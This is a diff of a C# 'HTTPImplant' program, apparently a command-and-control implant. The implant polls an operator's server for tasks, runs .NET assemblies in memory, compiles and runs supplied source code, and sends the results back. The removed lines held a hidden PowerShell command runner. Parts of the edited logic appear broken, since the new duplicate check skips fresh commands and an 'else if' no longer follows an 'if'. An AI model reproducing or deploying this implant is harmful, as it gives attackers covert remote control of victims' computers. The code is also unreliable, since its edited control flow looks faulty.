@@ -34,57 +34,36 @@ namespace HTTPImplant
                     try
                     {
                         string jsonResponse = await webClient.DownloadStringTaskAsync(new Uri("http://127.0.0.1:8081/fetchCommand"));
-
+                        Console.WriteLine("Getting instructions...");
                         Command command = new Command();
-                        command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
+                        command.Input = jsonResponse.Split(new string[] { "\"Input\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
+                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\",\"ImplantUser" }, StringSplitOptions.None)[1];
                         command.ImplantUser = jsonResponse.Split(new string[] { "\"ImplantUser\":\"", "\",\"Operator" }, StringSplitOptions.None)[1];
-                        command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
-                        command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
-                        command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"File" }, StringSplitOptions.None)[1];
-                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"Command" }, StringSplitOptions.None)[1];
-                        command.command = jsonResponse.Split(new string[] { "\"Command\":\"", "\"}" }, StringSplitOptions.None)[1];
+                        command.Operator = jsonResponse.Split(new string[] { "\"Operator\":\"", "\",\"delay" }, StringSplitOptions.None)[1];
+                        command.Delay = jsonResponse.Split(new string[] { "\"delay\":\"", "\",\"timeToExec" }, StringSplitOptions.None)[1];
+                        command.TimeToExec = jsonResponse.Split(new string[] { "\"timeToExec\":\"", "\",\"File" }, StringSplitOptions.None)[1];
+                        command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"nullterm" }, StringSplitOptions.None)[1];
+                        command.NullTerm = jsonResponse.Split(new string[] { "\"nullterm\":\"", "\"}" }, StringSplitOptions.None)[1];
 
+                        Console.WriteLine("Got: " + command.Input);
                         await Task.Delay(5000);
 
-                        if (command.command == lastCommandExecuted)
+                        if (command.command != lastCommandExecuted) {
+                            lastCommandExecuted = command.command;
                             continue;
-
-                        lastCommandExecuted = command.command;
-
-                        if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
-                        {
-                            ProcessStartInfo processStartInfo = new ProcessStartInfo
-                            {
-                                FileName = "powershell.exe",
-                                Arguments = "-NoLogo -NonInteractive -NoProfile -Command " + command.command,
-                                RedirectStandardOutput = true,
-                                UseShellExecute = false,
-                                CreateNoWindow = true
-                            };
-
-                            Process process = new Process
-                            {
-                                StartInfo = processStartInfo
-                            };
-
-                            process.Start();
-
-                            string output = process.StandardOutput.ReadToEnd();
-                            process.WaitForExit();
-
-                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                            await SendResult(webClient, implantId, command.Operator, outputBase64);
                         }
+
                         else if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
                         {
                             byte[] bytes = Convert.FromBase64String(command.File);
                             string output = ExecuteAssembly.Execute(bytes);
                             string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                            Console.WriteLine(output);
                             await SendResult(webClient, implantId, command.Operator, outputBase64);
                         }
                         else if (command.Input.Trim().Equals("internal", StringComparison.OrdinalIgnoreCase))
                         {
-                            string[] result = command.command.Split(new string[] { "#" }, StringSplitOptions.None);
+                            string[] result = command.command.Split(new string[] { " " }, StringSplitOptions.None);
                             string opCommand = result[0];
                             string args = result[1];
                             string output = Commands.command(opCommand, args);
@@ -96,7 +75,7 @@ namespace HTTPImplant
                             try
                             {
                                 // Split the information in command.File
-                                string[] parts = command.File.Split(new[] { " # " }, StringSplitOptions.None);
+                                string[] parts = command.File.Split(new[] { "  " }, StringSplitOptions.None);
                                 string encodedSourceCode = parts[0];
                                 string className = parts[1];
                                 string methodName = parts[2];
@@ -158,5 +137,6 @@ namespace HTTPImplant
         public string Delay { get; set; }
         public string File { get; set; }
         public string command { get; set; }
+        public string NullTerm { get; set; }
     }
 }
